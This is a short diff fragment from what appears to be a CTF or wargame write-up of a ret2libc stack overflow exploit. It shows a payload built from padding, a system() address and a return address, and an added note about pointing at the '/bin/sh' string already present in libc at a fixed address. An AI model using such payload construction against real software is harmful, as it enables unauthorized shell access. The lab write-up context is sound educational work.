@@ -66,6 +66,9 @@ gets_param_address = "\xbf\xff\xf6\xcc"[::-1]
 
 print string + pad + ret_address + system_address + saved_eip_pad + gets_param_address
 
+NOTE : instead of manually adding "/bin/sh\x00" and pointing to it,
+we can point directly to an identical string found in libc (at address 0xb7f8cc58)
+
 6 :
 Let's execute it :
 
